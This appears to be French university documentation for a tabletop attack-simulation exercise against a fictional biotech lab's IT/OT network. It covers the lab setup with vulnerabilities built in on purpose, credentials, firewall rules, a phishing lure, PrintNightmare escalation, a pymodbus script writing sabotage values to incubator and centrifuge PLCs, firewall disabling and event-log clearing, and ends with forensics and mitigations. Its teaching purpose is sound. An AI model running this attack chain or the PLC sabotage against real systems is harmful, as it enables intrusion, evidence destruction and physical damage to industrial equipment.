# 📋 P14 - DOCUMENTATION COMPLÈTE
## Sabotage Dispositifs Laboratoire Biomédical

---

# 1. CONTEXTE

| Information | Détail |
|-------------|--------|
| **Nom** | P14 - Sabotage Dispositifs Laboratoire Biomédical |
| **Type** | Breach and Attack Simulation (BAS) - Tabletop Exercise |
| **Cours** | Systèmes et Sécurité - INSA |
| **Durée** | 100 minutes |
| **Participants** | 9 joueurs / 7 équipes |
| **Dégâts max** | 350,000€ |
| **Inspiration** | Colonial Pipeline 2021 |

**Entreprise fictive:** BioTech Solutions - Startup biotechnologie (12 employés) spécialisée en culture cellulaire et thérapie génique.

**Objectif pédagogique:** Démontrer les risques de la frontière IT/OT à travers une chaîne d'attaque réaliste allant du phishing jusqu'au sabotage industriel.

---

# 2. ARCHITECTURE RÉSEAU

```
┌────────────────────────── ZONE IT ──────────────────────────┐
│                                                              │
│  VM1: P14-POSTE-IT (10.0.0.45)                              │
│  ├─ Windows 10/11 Pro (FR)                                  │
│  ├─ User: technicien / Tech2024!                            │
│  ├─ Saved RDP credentials → scada_user@10.0.0.10           │
│  ├─ Defender OFF, UAC OFF, Firewall OFF                     │
│  └─ PATIENT ZERO (victime phishing)                         │
│                                                              │
└──────────────────────────────┬───────────────────────────────┘
                               │
             ╔═════════════════╧═════════════════╗
             ║     FIREWALL VM2 (Windows)        ║
             ║  ─────────────────────────────    ║
             ║  P14-Block-IT-Zone: BLOCK all     ║
             ║  P14-Allow-Maintenance-VM1:       ║
             ║    ALLOW 10.0.0.45 → 3389 (RDP)   ║ ← Vulnérabilité!
             ╚═════════════════╤═════════════════╝
                               │
┌──────────────────────────────┴───────────────────────────────┐
│                         ZONE OT                               │
│                                                               │
│  VM2: P14-SCADA-OT (10.0.0.10)                               │
│  ├─ Windows Server 2022 (FR)                                 │
│  ├─ scada_user / Secure2024@! (Users + RDP)                  │
│  ├─ scada_admin / Scada2024 (Administrators)                 │
│  ├─ IIS + HMI Web Dashboard (port 80)                        │
│  ├─ SCADA API Service: scada_api.exe (port 5000)             │
│  ├─ Print Spooler: Running (PrintNightmare VULNERABLE)       │
│  ├─ Python: NTFS restrictions (bloqué pour Users)            │
│  └─ Données: C:\SCADA\ (~45MB)                               │
│                      │                                        │
│            ┌─────────┴─────────┐                             │
│            ▼                   ▼                             │
│  VM5 (10.0.0.80)         VM6 (10.0.0.59)                    │
│  ┌─────────────────┐     ┌─────────────────┐                │
│  │ PLC INCUBATEUR  │     │ PLC CENTRIFUGEUSE│                │
│  │ Debian 12       │     │ Debian 12        │                │
│  │ Port 502 Modbus │     │ Port 502 Modbus  │                │
│  │ Normal: 37.0°C  │     │ Normal: 3000 RPM │                │
│  │ Sabotage: 65°C  │     │ Sabotage: 9999   │                │
│  │ Dégâts: 50K€    │     │ Dégâts: 300K€    │                │
│  └─────────────────┘     └─────────────────┘                │
│                                                               │
└───────────────────────────────────────────────────────────────┘

Gateway: 10.0.0.254 (toutes les VMs)
```

---

# 3. SPÉCIFICATIONS VMs

## VM1 - Poste IT (Patient Zero)

| Paramètre | Valeur |
|-----------|--------|
| Hostname | P14-POSTE-IT |
| IP | 10.0.0.45/24 |
| OS | Windows 10/11 Pro (FR) |
| Comptes | technicien (Users), it.admin (Admins) |
| Protections | Désactivées (Defender, UAC, Firewall) |
| Credentials sauvegardées | TERMSRV/10.0.0.10 → scada_user |

## VM2 - Serveur SCADA

| Paramètre | Valeur |
|-----------|--------|
| Hostname | P14-SCADA-OT |
| IP | 10.0.0.10/24 |
| OS | Windows Server 2022 (FR) |
| Services | IIS (80), SCADA API (5000), Print Spooler |
| Données | C:\SCADA\ (~45MB) |

## VM5 - PLC Incubateur

| Paramètre | Valeur |
|-----------|--------|
| Hostname | PLC1 |
| IP | 10.0.0.80/24 |
| OS | Debian 12 |
| Service | plc-incubateur.service (port 502) |
| Python | 3.11.x + pymodbus 3.11.4 |

## VM6 - PLC Centrifugeuse

| Paramètre | Valeur |
|-----------|--------|
| Hostname | PLC2 |
| IP | 10.0.0.59/24 |
| OS | Debian 12 |
| Service | plc-centrifugeuse.service (port 502) |
| Python | 3.11.x + pymodbus 3.11.4 |

---

# 4. CREDENTIALS

| VM | Utilisateur | Mot de passe | Groupe |
|----|-------------|--------------|--------|
| VM1 | technicien | Tech2024! | Utilisateurs |
| VM1 | it.admin | ITAdmin2024! | Administrateurs |
| VM2 | scada_user | Secure2024@! | Utilisateurs + RDP Users |
| VM2 | scada_admin | Scada2024 | Administrateurs |
| VM5 | root | Plc2024! | root |
| VM6 | root | Plc2024! | root |

---

# 5. VULNÉRABILITÉS CONFIGURÉES

| Vulnérabilité | VM | Description |
|---------------|----|-------------|
| **PrintNightmare (CVE-2021-34527)** | VM2 | Print Spooler actif, non patché |
| **Saved RDP Credentials** | VM1 | scada_user dans Credential Manager |
| **Firewall Maintenance Exception** | VM2 | VM1→VM2:3389 autorisé (pattern Colonial Pipeline) |
| **Python NTFS Restriction** | VM2 | Users ne peuvent pas exécuter python.exe |
| **Application-based Firewall** | VM2 | Seul scada_api.exe peut accéder Modbus |

---

# 6. RÈGLES PARE-FEU VM2

## 6.1 Règles Inbound

| Règle | Action | Protocol | Port | Source | Priorité |
|-------|--------|----------|------|--------|----------|
| P14-Block-IT-Zone | Block | TCP | 80,443,502,3389,445 | 10.0.0.40-44, 10.0.0.46-50 | 1000 |
| P14-Allow-Maintenance-VM1 | Allow | TCP | 3389 | 10.0.0.45 | 500 |

## 6.2 Règles Outbound

| Règle | Action | Protocol | Port | Program | Priorité |
|-------|--------|----------|------|---------|----------|
| P14-Allow-Modbus-SCADA-API | Allow | TCP | 502 | C:\SCADA\HMI\api\scada_api.exe | 500 |
| P14-Block-Modbus-Python | Block | TCP | 502 | C:\Program Files\Python312\python.exe | 1000 |
| P14-Block-Modbus-PowerShell | Block | TCP | 502 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | 1000 |
| P14-Block-Modbus-CMD | Block | TCP | 502 | C:\Windows\System32\cmd.exe | 1000 |

## 6.3 Commandes de création

```powershell
# === INBOUND ===

# Block IT Zone (exclut VM1)
New-NetFirewallRule -DisplayName "P14-Block-IT-Zone" `
    -Direction Inbound -Action Block -Protocol TCP `
    -LocalPort 80,443,502,3389,445 `
    -RemoteAddress @("10.0.0.40-10.0.0.44","10.0.0.46-10.0.0.50") `
    -Enabled True

# Allow Maintenance depuis VM1 (VULNÉRABILITÉ - pattern Colonial Pipeline)
New-NetFirewallRule -DisplayName "P14-Allow-Maintenance-VM1" `
    -Direction Inbound -Action Allow -Protocol TCP `
    -LocalPort 3389 -RemoteAddress 10.0.0.45 `
    -Enabled True

# === OUTBOUND ===

# Allow Modbus pour SCADA API uniquement
New-NetFirewallRule -DisplayName "P14-Allow-Modbus-SCADA-API" `
    -Direction Outbound -Action Allow -Protocol TCP `
    -RemotePort 502 -Program "C:\SCADA\HMI\api\scada_api.exe" `
    -Enabled True

# Block Modbus pour Python
New-NetFirewallRule -DisplayName "P14-Block-Modbus-Python" `
    -Direction Outbound -Action Block -Protocol TCP `
    -RemotePort 502 -Program "C:\Program Files\Python312\python.exe" `
    -Enabled True

# Block Modbus pour PowerShell
New-NetFirewallRule -DisplayName "P14-Block-Modbus-PowerShell" `
    -Direction Outbound -Action Block -Protocol TCP `
    -RemotePort 502 -Program "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
    -Enabled True

# Block Modbus pour CMD
New-NetFirewallRule -DisplayName "P14-Block-Modbus-CMD" `
    -Direction Outbound -Action Block -Protocol TCP `
    -RemotePort 502 -Program "C:\Windows\System32\cmd.exe" `
    -Enabled True
```

## 6.4 Logique de sécurité

```
┌─────────────────────────────────────────────────────────────────┐
│                    FLUX AUTORISÉS                               │
├─────────────────────────────────────────────────────────────────┤
│  VM1 (10.0.0.45) ──RDP:3389──→ VM2     ✅ Maintenance exception │
│  scada_api.exe ──Modbus:502──→ PLCs    ✅ Application whitelist │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                    FLUX BLOQUÉS                                 │
├─────────────────────────────────────────────────────────────────┤
│  IT Zone (autres) ──*──→ VM2           ❌ Block IT Zone         │
│  python.exe ──Modbus:502──→ PLCs       ❌ Block application     │
│  powershell.exe ──Modbus:502──→ PLCs   ❌ Block application     │
│  cmd.exe ──Modbus:502──→ PLCs          ❌ Block application     │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                 APRÈS PRINTNIGHTMARE (SYSTEM)                   │
├─────────────────────────────────────────────────────────────────┤
│  Attaquant exécute: netsh advfirewall set allprofiles state off │
│  → Toutes les règles désactivées                                │
│  → python.exe peut maintenant accéder Modbus                    │
│  → Sabotage possible!                                           │
└─────────────────────────────────────────────────────────────────┘
```

---

# 7. REGISTRES MODBUS

## VM5 - INCUBATEUR (10.0.0.80)

| Reg | Description | Normal | Sabotage |
|-----|-------------|--------|----------|
| 0 | Temperature (×10) | 370 (37°C) | 650 (65°C) |
| 1 | Humidity (%) | 100 | - |
| 2 | Status | 1 (Running) | - |
| 3 | Time (hours) | 72 | - |
| 4 | Unused | 0 | - |
| 5 | Alarm | 0 | - |

## VM6 - CENTRIFUGEUSE (10.0.0.59)

| Reg | Description | Normal | Sabotage |
|-----|-------------|--------|----------|
| 0 | Speed (RPM) | 3000 | 9999 |
| 1 | Status | 1 (Running) | - |
| 2 | Time (minutes) | 30 | - |
| 3 | Temperature (×10) | 220 (22°C) | - |
| 4 | Vibration | 0 | - |
| 5 | Alarm | 0 | - |

---

# 8. SCÉNARIO D'ATTAQUE (9 PHASES)

## PHASE 1: Spear Phishing [T+0 → T+15]

**Cible:** Marie Dubois (technicien) sur VM1

**Email:**
```
De: support@lab-equipment-services.com
Objet: [URGENT] Alerte calibration INCUBATEUR-2024

Bonjour,
Dérive température 0.2°C détectée sur votre incubateur (SN: INC-2024-BTS-001).
Arrêt automatique prévu dans 24h si non corrigé.

→ Télécharger: Firmware_Calibration_Procedure.pdf.exe
```

**Payload:** Fake executable qui capture credentials et installe malware

**Résultat:** VM1 compromise, credentials technicien capturées

**MITRE:** T1566.001, T1204.002

---

## PHASE 2: Credential Harvesting [T+15 → T+30]

**Objectif:** Trouver accès vers zone OT

**Commandes (VM1):**
```powershell
whoami
# P14-POSTE-IT\technicien

whoami /groups
# BUILTIN\Utilisateurs (pas admin)

cmdkey /list
# Cible: TERMSRV/10.0.0.10
# Utilisateur: scada_user ← DÉCOUVERT!
```

**Résultat:** Credentials RDP sauvegardées pour VM2

**MITRE:** T1555.004

---

## PHASE 3: Mouvement Latéral IT→OT [T+30 → T+45]

**Objectif:** Accéder au serveur SCADA

**Commandes (VM1):**
```powershell
Test-NetConnection -ComputerName 10.0.0.10 -Port 3389
# TcpTestSucceeded: True

mstsc /v:10.0.0.10
# Windows utilise automatiquement les credentials sauvegardées
```

**Résultat:** Session RDP sur VM2 en tant que scada_user

### ⚠️ POINT DE DÉCISION #1 (T+40)

**Alerte SOC:** Event 4624 Type 10 - RDP IT→OT détecté

**Question:** Bloquer l'exception pare-feu?
| Option | Résultat |
|--------|----------|
| A) Bloquer | Attaque stoppée, 0€ dégâts |
| B) Surveiller | Attaque continue |

**Temps:** 5 minutes

**MITRE:** T1021.001

---

## PHASE 4: Reconnaissance OT [T+45 → T+55]

**Objectif:** Cartographier environnement et trouver vulnérabilités

**Commandes (VM2 avec scada_user):**
```powershell
whoami /groups
# BUILTIN\Utilisateurs (pas admin!)

# Scan Modbus
1..254 | % { 
    try { 
        $tcp = New-Object Net.Sockets.TcpClient
        $tcp.Connect("10.0.0.$_", 502)
        Write-Host "[MODBUS] 10.0.0.$_"
        $tcp.Close()
    } catch {}
}
# Résultat: 10.0.0.80, 10.0.0.59

# Test Python
python --version
# ERREUR: Accès refusé (NTFS restriction)

# Test PowerShell TCP
$tcp = New-Object Net.Sockets.TcpClient
$tcp.Connect("10.0.0.80", 502)
# ERREUR: WinError 10013 - Bloqué par firewall!

# Découverte Print Spooler
Get-Service Spooler
# Status: Running ← PrintNightmare possible!
```

**Analyse:** 
- PLCs trouvés: 10.0.0.80, 10.0.0.59
- Python bloqué (NTFS)
- Modbus bloqué (Firewall)
- Print Spooler vulnérable

**MITRE:** T1046, T1007

---

## PHASE 5: Privilege Escalation - PrintNightmare [T+55 → T+70]

**Objectif:** Obtenir SYSTEM pour bypass restrictions

**Vérification:**
```powershell
Get-Service Spooler
# Running, Automatic

Get-HotFix | Where-Object {$_.HotFixID -match "KB5004945"}
# Aucun résultat → NON PATCHÉ!

# Test SMB vers VM1 (pour DLL hosting)
Test-NetConnection -ComputerName 10.0.0.45 -Port 445
# TcpTestSucceeded: True
```

**Exploitation:**
```powershell
# Héberger DLL malveillante sur VM1 (\\10.0.0.45\share\payload.dll)
# Ou utiliser chemin local: C:\Windows\Temp\payload.dll

Import-Module .\CVE-2021-34527.ps1
Invoke-Nightmare -DLL "\\10.0.0.45\share\payload.dll"

# La DLL exécute avec privilèges SYSTEM:
# cmd /c net localgroup Administrators scada_user /add
```

**Vérification:**
```powershell
whoami /groups | findstr Administrators
# BUILTIN\Administrators ← SUCCÈS!
```

**MITRE:** T1068, T1547.012

---

## PHASE 6: Sabotage PLC [T+70 → T+85]

**Objectif:** Destruction équipements laboratoire

**Étape 6.1: Désactiver pare-feu**
```powershell
netsh advfirewall set allprofiles state off
```

**Étape 6.2: Sabotage simultané**
```python
from pymodbus.client import ModbusTcpClient

# INCUBATEUR: 37°C → 65°C (tue les cellules)
plc1 = ModbusTcpClient('10.0.0.80', port=502)
plc1.connect()
plc1.write_register(address=0, value=650)
print("[!] INCUBATEUR: 65°C - Échantillons détruits!")
plc1.close()

# CENTRIFUGEUSE: 3000 → 9999 RPM (destruction mécanique)
plc2 = ModbusTcpClient('10.0.0.59', port=502)
plc2.connect()
plc2.write_register(address=0, value=9999)
print("[!] CENTRIFUGEUSE: 9999 RPM - Destruction!")
plc2.close()

print("\n[!!!] SABOTAGE COMPLET - DÉGÂTS: 350,000€")
```

### ⚠️ POINT DE DÉCISION #2 (T+82)

**Alertes:**
- INCUBATEUR: 37°C → 65°C (seuil critique: 42°C)
- CENTRIFUGEUSE: 3000 → 9999 RPM (seuil: 6000 RPM)

**Contrainte:** Un seul arrêt d'urgence possible!

**Question:** Quel équipement sauver?
| Option | Sauve | Perd |
|--------|-------|------|
| A) Incubateur | 50K€ (échantillons) | 300K€ (équipement) |
| B) Centrifugeuse | 300K€ (équipement) | 50K€ (échantillons) |

**Indice:** L'équipement est remplaçable, la recherche ne l'est pas.

**Temps:** 3 minutes

**MITRE ICS:** T0831, T0836

---

## PHASE 7: Exfiltration [T+85 → T+92]

**Objectif:** Vol données sensibles

**Commandes:**
```powershell
Get-ChildItem C:\SCADA\ -Recurse | Measure-Object -Property Length -Sum
# ~45 MB

Compress-Archive -Path C:\SCADA\* -DestinationPath C:\Temp\backup.zip
```

**Données volées:**
- Patients (RGPD)
- Protocoles recherche
- Formules propriétaires
- Brevets en cours

**MITRE:** T1560.001, T1041

---

## PHASE 8: Cover Tracks [T+92 → T+95]

**Objectif:** Effacer traces

**Commandes:**
```powershell
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
```

**Note:** Event 1102 (Log cleared) reste visible si pas effacé en premier!

**MITRE:** T1070.001

---

## PHASE 9: Forensics & Mitigations [T+95 → T+100]

**Forensics - Artefacts:**
```powershell
# Connexions RDP
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624}

# Print Spooler exploitation
Get-WinEvent -LogName "Microsoft-Windows-PrintService/Operational"

# Log clearing
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 1102}
```

**Mitigations recommandées:**
1. Supprimer exception pare-feu maintenance
2. Patcher PrintNightmare (KB5004945)
3. Segmentation réseau IT/OT stricte
4. Désactiver Print Spooler sur serveurs OT
5. Monitoring comportemental (RDP anormal)

---

# 9. IMPACT FINANCIER

| Décision #1 | Décision #2 | Total |
|-------------|-------------|------:|
| Bloquer | - | **0€** |
| Surveiller | Sauver Incubateur | **300,000€** |
| Surveiller | Sauver Centrifugeuse | **50,000€** |
| Surveiller | Aucune action | **350,000€** |

---

# 10. MITRE ATT&CK MAPPING

| Phase | ID | Technique |
|-------|-----|-----------|
| 1 | T1566.001 | Spearphishing Attachment |
| 1 | T1204.002 | User Execution: Malicious File |
| 2 | T1555.004 | Credentials from Password Stores |
| 3 | T1021.001 | Remote Desktop Protocol |
| 4 | T1046 | Network Service Discovery |
| 4 | T1007 | System Service Discovery |
| 5 | T1068 | Exploitation for Privilege Escalation |
| 5 | T1547.012 | Print Processors |
| 6 | T0831 | Manipulation of Control (ICS) |
| 6 | T0836 | Modify Parameter (ICS) |
| 7 | T1560.001 | Archive Collected Data |
| 7 | T1041 | Exfiltration Over C2 Channel |
| 8 | T1070.001 | Clear Windows Event Logs |

---

# 11. FICHIERS REQUIS

| Fichier | Emplacement | Fourni |
|---------|-------------|--------|
| plc_incubateur.py | VM5:/opt/p14-plc1/ | Séparément |
| plc_centrifugeuse.py | VM6:/opt/p14-plc2/ | Séparément |
| scada_api.py | VM2:C:\SCADA\HMI\api\ | Séparément |
| index.html | VM2:C:\inetpub\wwwroot\ | Séparément |
| CVE-2021-34527.ps1 | Attacker toolkit | Public PoC |
| payload.dll | Attacker toolkit | Généré |

---

# 12. TIMELINE VISUELLE

```
T+0   ──┬── PHASE 1: Phishing email → VM1 compromise
        │
T+15  ──┼── PHASE 2: cmdkey /list → Discover scada_user credentials
        │
T+30  ──┼── PHASE 3: RDP VM1→VM2 avec scada_user
        │   ⚠️ DÉCISION #1: Bloquer firewall?
T+40  ──┼──
        │
T+45  ──┼── PHASE 4: Reconnaissance (PLCs, PrintSpooler)
        │
T+55  ──┼── PHASE 5: PrintNightmare → SYSTEM
        │
T+70  ──┼── PHASE 6: Disable firewall + Sabotage PLCs
        │   ⚠️ DÉCISION #2: Quel PLC sauver?
T+82  ──┼──
T+85  ──┼── PHASE 7: Exfiltration C:\SCADA\
        │
T+92  ──┼── PHASE 8: Cover tracks (wevtutil)
        │
T+95  ──┼── PHASE 9: Forensics + Mitigations
        │
T+100 ──┴── FIN EXERCICE
```

---

# 13. VÉRIFICATION PRÉ-EXERCICE

## Checklist VM1
- [ ] IP: 10.0.0.45
- [ ] Compte technicien existe
- [ ] Defender/UAC/Firewall OFF
- [ ] Credentials sauvegardées (cmdkey /list)
- [ ] RDP vers VM2 fonctionne

## Checklist VM2
- [ ] IP: 10.0.0.10
- [ ] Comptes scada_user et scada_admin existent
- [ ] Service SCADA_API running
- [ ] Print Spooler running + non patché
- [ ] Règles pare-feu P14-* configurées
- [ ] Données C:\SCADA\ (~45MB)

## Checklist VM5/VM6
- [ ] Services PLC running
- [ ] Port 502 listening
- [ ] Registres Modbus corrects
- [ ] Accessible depuis VM2 (via scada_api.exe)
